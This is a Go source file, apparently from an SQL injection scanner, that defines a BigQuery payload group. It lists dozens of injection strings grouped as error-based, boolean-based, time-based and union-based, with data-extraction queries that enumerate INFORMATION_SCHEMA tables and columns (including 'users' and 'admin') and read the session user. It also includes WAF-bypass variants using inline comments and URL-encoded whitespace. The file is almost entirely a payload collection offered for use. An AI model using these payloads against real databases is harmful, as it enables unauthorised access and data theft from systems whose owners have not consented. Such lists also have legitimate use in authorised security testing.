package payloads

var BigQuery = PayloadGroup{
	DBMS: "BigQuery",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=ERROR(1)--"},
		{Type: "error", Content: "' AND IF(1=1,ERROR(1),1)--"},
		{Type: "error", Content: "' AND IF(1=2,1,ERROR(1))--"},
		{Type: "error", Content: "' AND ERROR(CAST((SELECT table_name FROM INFORMATION_SCHEMA.TABLES LIMIT 1) AS STRING))--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 2)--", Expected: "false"},
		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND IF(1=1,1,0)=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND IF(1=2,1,0)=0--", Expected: "true"},

		// ═══════════════════════════════════════════
		// TIME-BASED (BigQuery uses sleep)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "'; SELECT SLEEP(5);--"},
		{Type: "time", Content: "' OR SLEEP(5)--"},
		{Type: "time", Content: "' AND IF(1=1,SLEEP(5),0)--"},
		{Type: "time", Content: "' AND (SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)--"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' UNION SELECT 1--"},
		{Type: "union", Content: "' UNION SELECT 1,2--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT TABLE_CATALOG||'.'||TABLE_SCHEMA||'.'||TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--"},
		{Type: "deep", Content: "' UNION SELECT COLUMN_NAME||':'||DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--"},
		{Type: "deep", Content: "' UNION SELECT SESSION_USER()--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_DATETIME()--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "'/**/UNION/**/SELECT/**/NULL--"},
		{Type: "bypass", Content: "'%0AOR%0A1%3D1--"},
		{Type: "bypass", Content: "'%09OR%091%3D1--"},
		{Type: "bypass", Content: "'%0AUNION%0ASELECT%0A1--"},
		{Type: "bypass", Content: "'%09UNION%09SELECT%091--"},
		{Type: "bypass", Content: "'%2F**%2FUNION%2F**%2FSELECT%2F**%2F1--"},
		{Type: "bypass", Content: "'%09AND%091%3D1--"},
		{Type: "bypass", Content: "'%0AAND%0A1%3D1--"},
		{Type: "time", Content: "' AND IF(1=1,SLEEP(10),0)--"},
		{Type: "time", Content: "' AND IF(1=1,SLEEP(3),0)--"},
		{Type: "time", Content: "') AND SLEEP(5)--"},
		{Type: "time", Content: "\" AND SLEEP(5)--"},
		{Type: "time", Content: "' OR SLEEP(10)--"},
		{Type: "union", Content: "\" UNION SELECT 1,2--"},
		{Type: "union", Content: "\" UNION SELECT 1,2,3--"},
		{Type: "union", Content: "\") UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4,5--"},
		{Type: "union", Content: "' UNION ALL SELECT NULL,NULL--"},
		{Type: "boolean", Content: "\" AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "\" AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' OR 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' OR 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND '1'='1", Expected: "true"},
		{Type: "boolean", Content: "' AND '1'='2", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1)=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=2--", Expected: "false"},
		{Type: "error", Content: "' AND IF(1=1,1,ERROR('x'))--"},
		{Type: "error", Content: "' AND ERROR(CAST(CURRENT_DATETIME() AS STRING))--"},
		{Type: "error", Content: "' AND ERROR(CAST(SESSION_USER() AS STRING))--"},
		{Type: "error", Content: "' AND 1=ERROR(CAST((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS LIMIT 1) AS STRING))--"},
		{Type: "deep", Content: "' UNION SELECT TABLE_CATALOG||'.'||TABLE_NAME FROM INFORMATION_SCHEMA.TABLES ORDER BY 1--"},
		{Type: "deep", Content: "' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin'--"},
		{Type: "deep", Content: "' UNION SELECT TABLE_CATALOG||'.'||TABLE_SCHEMA||'.'||TABLE_NAME||':'||COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_TIMESTAMP()--"},
	},
}

